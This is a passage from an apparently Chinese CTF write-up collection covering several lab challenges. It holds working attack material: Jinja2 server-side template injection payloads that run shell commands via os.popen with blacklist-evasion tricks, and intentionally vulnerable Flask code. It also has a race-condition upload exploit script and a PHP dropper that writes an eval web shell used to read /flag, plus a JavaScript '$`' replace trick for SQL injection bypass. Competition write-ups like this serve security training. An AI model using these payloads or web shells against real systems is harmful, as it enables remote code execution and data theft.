130, 500, 467, 762, 428, 303, 239, 177, 748, 511, 525, 88, 453, 266, 572, 752, 391, 542, 248, 246, 138, 473, 48, 524, 281, 212, 522, 481, 323, 496, 420, 574, 437, 232, 99, 28, 469, 387, 722, 143, 767, 148, 280, 285, 90, 344, 234, 8, 227, 270, 291, 513, 312, 657, 61, 260, 607, 751, 301, 152, 275, 480, 214, 259, 243, 326, 573, 375, 226, 704, 563, 81, 199, 7, 250, 366, 225, 725, 146, 487, 251, 396, 699, 590, 686, 305, 342, 578, 333, 706, 528, 237, 656, 197, 380, 100, 3, 439, 174, 489, 249, 300, 343, 345, 549, 293, 220, 506, 474, 261, 299, 173, 478, 394, 759, 620, 484, 404, 562, 96, 369, 555, 194, 708, 438, 26, 702, 642, 658, 672, 519, 50, 125, 43, 331, 470, 719, 44, 551, 673, 182, 370, 421, 355, 570, 132, 354, 231, 495, 262, 648, 172, 629, 168, 6, 564, 136, 30, 382, 171, 653, 761, 755, 162, 315, 732, 325, 189, 669, 253, 596, 697, 67, 306, 144, 503, 29, 178, 677, 103, 707, 548, 701, 112, 191, 530, 242, 756, 479, 616, 632, 430, 539, 527, 221, 15, 329, 175, 445, 623, 14, 560, 247, 97, 544, 284, 133, 228, 68, 757, 71, 712, 95, 557, 715, 384, 0};
unsigned int dwBitNum = len * 8; BitDecode(cipher, box, dwBitNum);
return 0;}
int main(){
unsigned char flag[] = {0x0C,0x61,0x48,0x3A,0x01,0x44,0xD2,0x8D,0xCA,0x0B,0xB8,0x02,0xB1,0xC5,0x88,0x64,0x67,0x69,0x26,0x69,0x11,0xC7,0x47,0x1F,0xDC,0xB7,0x0E,0x1A,0x50,0xC3,0x57,0x0D,0x75,0xAF,0x01,0x58,0x14,0xA2,0x0A,0xFF,0xC8,0x8C,0x05,0xD9,0x40,0xF6,0xA3,0x16,0x21,0x5B,0x3D,0xFF,0x59,0xC2,0xFB,0x54,0x83,0x81,0xB4,0x8E,0x6A,0x50,0x1C,0x08,0xA5,0xB8,0xE4,0x4D,0x41,0xA3,0x12,0x00,0xF0,0xC8,0x0A,0x96,0xAA,0x79,0x48,0xF1,0x5B,0x24,0xD0,0x9D,0x75,0xB7,0xA8,0xDA,0x86,0x44,0x37,0x0B,0xB0,0x44,0x24,0x4C,0x00};
unsigned int flag_length = 96; BitDanceDecode(flag, flag_length);printf("%sn", flag);}
```
```shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}

该payload将执行系统命令，ls```
````shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") }}{% endif %}{% endfor %}

该payload将执行系统命令，ls /````
```shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %}```
```shell
from flask import Flask, request, render_template, render_template_string, redirect, url_for, abortfrom urllib.parse import unquote
app = Flask(__name__)
phone = ''
def is_safe_input(user_input):# unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__'] unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']if any(keyword in user_input for keyword in unsafe_keywords):# if user_input in unsafe_keywords:
return Truereturn False
@app.route("/")def index():
return render_template("index.html")
@app.route("/login", methods=["POST"])def login():
global phone phone = request.form.get("phone_number")return render_template("login.html")
@app.route("/cpass", methods=["POST"])def check():
global phone password = request.form.get("password")
if is_safe_input(phone):
return redirect(url_for('index'))
if phone != "1686682318" and password != "Happy_news_admin":
return render_template_string('<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>login failed</title> </head>  <script>alert("{}The number does not exist or the password is incorrect!") </script> <script>window.location.href = "/";</script>  </html>'.format(phone))else:
return redirect(url_for('index'))
if __name__ == '__main__': app.run(host="0.0.0.0", port=int("5005"), debug=True)The number does not exist or the password is incorrect!")```
```shellunsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']```
```shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cd ..;ls').read()") }}{% endif %}{% endfor %}
该payload将执行系统命令等价于：ls /```
```shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cd ..;t''ac fl''agf149').read()") }}{% endif %}{% endfor %}
该payload将执行系统命令等价于：tac /flagf149```
```shell脚本执行命令：python exp.py ip porteg：python exp.py 192.168.18.32 5005```
```shellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/e63ea739dcfe620a6da2d5743fca7aef.jpghttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/a9eb430817ca0ca62b44895f5235c0a2.php```
```shellphp文件允许上传，且判断方式为，先保存再判断文件是否符合要求，不符合要求再删除该文件： --绕过方式：条件竞争 --前提条件：需要明确文件夹及文件名的保存方式```
```shell该文件夹是留给选手的提示，也属于信息泄露问题： 文件夹： 1、127.0.0.1：意为文件夹明文形式为ip地址形式 2、用户自己上传的文件保存文件夹位置为32位小写数据，隐性提示文件夹命名格式：md5(ip) 上传文件名： 1、127.0.0.11733883325：组成形式可以分为两部分-127.0.0.1：ip-1733883325：十位字符取整数部分的时间戳 2、用户自己上传的文件保存的文件名为32位小写数据，隐性提示文件夹命名格式：md5(ip+时间戳)```
```pythonimport requestsimport hashlibimport time
# 设置目标网页的URL。需要修改IP地址与上传文件保存位置的文件夹名url = 'http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/'
# ipprefix_string = '192.168.16.43' # 这个ip为选手访问靶机的出口ip
# 使用一个while循环来保持请求，直到返回200响应while True:# 使用生成的MD5值作为文件名
def md5_encrypt(string): md5_obj = hashlib.md5()
 md5_obj.update(string.encode('utf-8'))
 md5_hash = md5_obj.hexdigest()
return md5_hash
# 获取当前时间戳并提取证书部分（只保留时间，去掉日期部分） timestamp = time.time() timestamp = int(timestamp)
# 拼接指定字符串和时间戳 raw_string = prefix_string + str(timestamp)
# 对拼接后的字符串进行MD5加密 md5_filename = md5_encrypt(raw_string)
# 发起GET请求 response = requests.get(url+md5_filename+'.php')
# 检查响应的状态码if response.status_code == 200: print(f'请求成功，访问的URL为: {response.url}')break # 停止请求elif response.status_code == 404: print(f'{response.url}: 页面未找到 (404)，继续请求...')else: print(f'{response.url}: 请求失败，状态码: {response.status_code}')break # 如果状态码不是404或200，终止请求```
```php<?php fputs(fopen('2.php','w'),'<?php @eval($_REQUEST[a]);?>');?>```
```shell> python b.py
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...请求成功，访问的URL为: http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php```
```shellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=phpinfo();```
```shellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=print_r(scandir('/'));
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=print_r(file_get_contents('/flag'));```
```shell启动命令格式: python exp.py -rip 目标靶机IP -p 靶机服务端口 -lip 本地出口ip -cookie 已取得后台访问权限的cookie
eg: python exp.py -rip 192.168.18.32 -p 80 -lip 192.168.16.43 -cookie PHPSESSID=qi6nkhcmals15ljqbm3qaup8sp```
```传入a=123&a=456&a=789最终接收到的是a=[123,456,789]
a={"name":"admin"&a="pass":"123456"}最终接收到的是[ '{"name":"admin"', '"pass":"123456"}' ]
经过JSON.parse()则可以解析json得到{"name":"admin","pass":"123456"}```
```$````
```var a ="abcd";a = a.replace("c","$`");```
```?username=$` ||1%23&password=123```
```select * from userinfo where username = 'select * from userinfo where username = ' ||1#' and password = '123456'```
```?info={"username":"$` ||1%23"&info="password":"123456"}```
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1737867298.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1737867298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1737867298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1737867299.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1737867299.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1737867300.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1737867300.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1737867301.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/0-1737867301.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1737867301.png)